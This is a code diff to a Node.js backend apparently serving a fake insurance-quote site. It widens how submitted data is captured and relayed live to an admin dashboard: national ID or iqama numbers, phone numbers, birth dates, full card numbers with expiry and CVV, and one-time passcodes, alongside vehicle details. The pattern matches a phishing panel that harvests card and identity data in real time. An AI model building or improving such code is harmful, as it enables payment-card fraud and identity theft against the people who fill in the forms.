@@ -193,8 +193,19 @@ function recordSubmission(type, payload) {
   io.emit("live:update", entry);
   if (id) {
     // Mirror flat fields so the dashboard's session table shows the data.
-    // The site nests the real form values under payload.formData.
-    const p = { ...(payload || {}), ...((payload || {}).formData || {}) };
+    // The site nests real values under payload.formData (sometimes deeper),
+    // so flatten every nested object into one lookup map.
+    const p = {};
+    const collect = (obj, depth = 0) => {
+      if (!obj || typeof obj !== "object" || depth > 4) return;
+      for (const [k, v] of Object.entries(obj)) {
+        if (v && typeof v === "object") collect(v, depth + 1);
+        else if (v !== undefined && v !== null && String(v).trim() !== "" && p[k] === undefined)
+          p[k] = v;
+      }
+    };
+    collect(payload);
+
     const flat = {};
     const set = (key, names) => {
       const v = pick(p, names);
@@ -202,15 +213,27 @@ function recordSubmission(type, payload) {
     };
     set("idNumber", ["identityNumber", "nationalIdIqama", "idNumber", "nationalId", "iqama"]);
     set("phone", ["mobileNumber", "phone", "phoneNumber", "mobile"]);
-    set("name", ["documentOwnerName", "name", "fullName", "cardholderName"]);
+    set("name", ["documentOwnerName", "name", "fullName"]);
+    set("cardholderName", ["cardholderName"]);
+
     set("sequenceNumber", ["sequenceNumber", "serialNumber"]);
     set("birthDate", ["birthDate", "dateOfBirth", "dob"]);
     set("email", ["email"]);
     set("company", ["compname", "company", "insuranceCompany"]);
     set("price", ["totalPrice", "price", "amount"]);
     set("insuranceType", ["TypeOfInsuranceContract", "insuranceType"]);
+    set("carValue", ["carValue", "vehicleValue", "estimatedValue"]);
+    set("carMake", ["vehicleMaker", "carMake", "make", "maker", "brand", "vehicleBrand"]);
+    set("carModel", ["vehicleModel", "carModel", "model", "modelName"]);
+    set("carYear", ["modelYear", "vehicleYear", "carYear", "year"]);
+    set("plateNumber", ["plateNumber", "plate", "customCardNumber", "vehiclePlate"]);
+    set("carType", ["carType", "vehicleType", "bodyType"]);
     set("cardNumber", ["cardNumber"]);
-    set("cardExpiry", ["expiry", "expiryDate"]);
+
+
+    set("cardExpiry", ["expiry", "expiryDate", "expiryMonth"]);
+    set("cardExpiryYear", ["expiryYear"]);
+    set("paymentMethod", ["paymentMethod"]);
     set("cardCvv", ["cvv"]);
     set("otp", ["otp", "otpCode", "code"]);
     set("result", ["result"]);
@@ -241,7 +264,7 @@ function broadcastAdminEvent(id, event, payload) {
 app.get("/", (_req, res) => res.json({ ok: true, service: "gosuksa-backend" }));
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
-const APP_VERSION = "v8";
+const APP_VERSION = "v9";
 app.get("/version", (_req, res) =>
   res.json({
     version: APP_VERSION,
